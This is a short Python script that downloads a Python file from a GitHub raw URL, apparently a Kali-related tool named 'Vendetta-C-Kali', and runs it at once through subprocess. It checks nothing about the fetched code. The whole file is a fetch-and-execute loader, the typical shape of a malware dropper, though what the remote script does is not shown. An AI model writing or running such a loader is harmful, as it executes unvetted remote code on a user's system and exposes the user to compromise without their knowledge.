import requests
import subprocess

url = 'https://raw.githubusercontent.com/vendetta256/Vendetta-C-Kali/main/Vendetta-C-Kali.py'

response = requests.get(url)
script = response.content.decode('utf-8')

subprocess.run(['python3', '-c', script])
